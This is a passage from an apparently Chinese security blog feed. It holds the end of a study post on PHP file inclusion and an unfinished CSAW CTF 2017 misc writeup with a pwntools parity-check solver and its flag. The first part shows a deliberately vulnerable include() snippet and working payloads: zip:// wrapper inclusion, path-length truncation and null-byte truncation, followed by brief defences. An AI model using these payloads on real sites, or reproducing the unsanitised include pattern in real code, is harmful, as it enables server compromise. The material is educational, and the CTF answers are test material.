<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>前面有提到过利用zip协议和phar协议。假设现在测试代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>构造压缩包如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" alt=""></p>
<p>其中test.php内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php phpinfo(); ?&gt;</div></pre></td></tr></table></figure></p>
<p>利用zip协议，注意要指定绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</div></pre></td></tr></table></figure></p>
<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" alt=""></p>
<p>能成功包含。</p>
<p>在利用phar协议的时候有些问题。哪位能指教一下？<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" alt=""></p>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件： php版本 &lt; php 5.2.8</p>
<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=././././。。。省略。。。././shell.txt</div></pre></td></tr></table></figure></p>
<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件： php版本 &lt; php 5.3.4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phpinfo.txt%00</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" alt=""></p>
<p>能利用00截断的场景现在应该很少了：）</p>
<h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol>
<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
<li>做好文件的权限管理</li>
<li>对危险字符进行过滤等等</li>
</ol>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li>《白帽子讲Web安全》</li>
<li><a href="https://dustri.org/b/from-lfi-to-rce-in-php.html" target="_blank" rel="external">From LFI to RCE in php </a></li>
<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">l3m0n: 文件包含漏洞小结</a></li>
<li><a href="https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank" rel="external">LFI Cheat Sheet</a></li>
<li><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion" target="_blank" rel="external">Local File Inclusion</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php文件包含漏洞学习&lt;br&gt;合上吧，没有新姿势。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="文件包含" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="伪协议" scheme="http://chybeta.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF 2017-MISC-writeup</title>
    <link href="http://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/"/>
    <id>http://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/</id>
    <published>2017-10-07T00:50:23.000Z</published>
    <updated>2017-10-07T02:20:05.046Z</updated>
    
    <content type="html"><![CDATA[<p>待续。<br><a id="more"></a></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc misc.chal.csaw.io 4239</div></pre></td></tr></table></figure>
<p>考察数据奇偶校验。nc连上后，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/test# nc misc.chal.csaw.io 4239</div><div class="line">8-1-1 even parity. Respond with &apos;1&apos; if you got the byte, &apos;0&apos; to retransmit.</div><div class="line">00110010001</div><div class="line">0 # ps: 这是我发送的</div><div class="line">00100011001</div></pre></td></tr></table></figure></p>
<p>初次连上后，会给出一个字符串 00110010001，根据偶校验，选择发送是0还是1，然后服务器端会再返回下一个字符串。</p>
<p>从给出的提示信息，以及结合串口通信标准来看，每次我们收到的字符串总共是11位，其中第一位都是0，表示数据的开始，剩下的数据满足<code>8-1-1</code>，是指有8位数据位，1位校检位，以及1位的停止位。</p>
<p>比如说：00110010001</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">起始位</th>
<th style="text-align:center">数据位</th>
<th style="text-align:center">奇偶校验位</th>
<th style="text-align:center">停止位</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">01100100</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
</div>
<p>这里数据位中1的个数是3，为奇数，奇偶校验位本应该为1，但接受的数据的奇偶校验位为0，说明发生了错误。根据题目的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Respond with &apos;1&apos; if you got the byte, &apos;0&apos; to retransmit.</div></pre></td></tr></table></figure></p>
<p>我们要返回一个 0。</p>
<p>最后的脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>,<span class="number">4239</span>)</div><div class="line">r.recvuntil(<span class="string">"Respond with '1' if you got the byte, '0' to retransmit.\n"</span>)</div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s = r.recv()</div><div class="line">		data = s[<span class="number">1</span>:<span class="number">9</span>]</div><div class="line">		even = s[<span class="number">9</span>]</div><div class="line">		end = s[<span class="number">10</span>]</div><div class="line">		num = <span class="number">0</span></div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span>  data:</div><div class="line">			<span class="keyword">if</span> i == <span class="string">'1'</span>:</div><div class="line">				num = num + <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> (num % <span class="number">2</span> == <span class="number">0</span>  <span class="keyword">and</span> even == <span class="string">"0"</span>) <span class="keyword">or</span> (num % <span class="number">2</span> != <span class="number">0</span> <span class="keyword">and</span> even == <span class="string">"1"</span>) :</div><div class="line">			r.sendline(<span class="string">"1"</span>)</div><div class="line">			flag += chr(int(data,<span class="number">2</span>))</div><div class="line">			<span class="comment"># print(chr(int(data,2)))</span></div><div class="line">			log.info(flag)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			r.sendline(<span class="string">"0"</span>)</div><div class="line">	<span class="keyword">except</span>:</div><div class="line">		<span class="keyword">break</span></div><div class="line"></div><div class="line">log.success(<span class="string">"The flag : "</span> + flag)</div></pre></td></tr></table></figure></p>
<p>最后得到的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;@n_int3rface_betw33n_data_term1nal_3quipment_and_d@t@_circuit-term1nating_3quipment&#125;</div></pre></td></tr></table></figure></p>
<h2 id="CVV"><a href="#CVV" class="headerlink" title="CVV"></a>CVV</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hey fam, you got CVV? I need some CVV!</div><div class="line">nc misc.chal.csaw.io 8308</div></pre></td></tr></table></figure>
<h2 id="Twitch-Plays-Pwnable"><a href="#Twitch-Plays-Pwnable" class="headerlink" title="Twitch Plays Pwnable"></a>Twitch Plays Pwnable</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">How long does it take several thousand hackers to exploit a buffer overflow?</div><div class="line">https://twitch.tv/csawtv</div><div class="line">UPDATE 8:03 Eastern: Apparently the answer is ~10 hours to not exploit the overflow.</div></pre></td></tr></table></figure>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Missed-Registration"><a href="#Missed-Registration" class="headerlink" title="Missed Registration"></a>Missed Registration</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">It&apos;s registration day! These forms just seem longer and longer...</div><div class="line">UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.</div><div class="line">UPDATE 2:58 Eastern: We&apos;re regenerating due to flag leaks, submissions disabled until then. Please be patient.</div><div class="line">Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!</div></pre></td></tr></table></figure>
<p>追踪TCP流看一下。</p>
<h2 id="Forensics-1"><a href="#Forensics-1" class="headerlink" title="Forensics"></a>Forensics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Best Router</div><div class="line">http://forensics.chal.csaw.io:3287</div><div class="line">NOTE: This will expand to ~16GB!</div><div class="line">19:00 Eastern: updated. Old flags have been removed.</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待续。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
  </entry>
  
</feed>
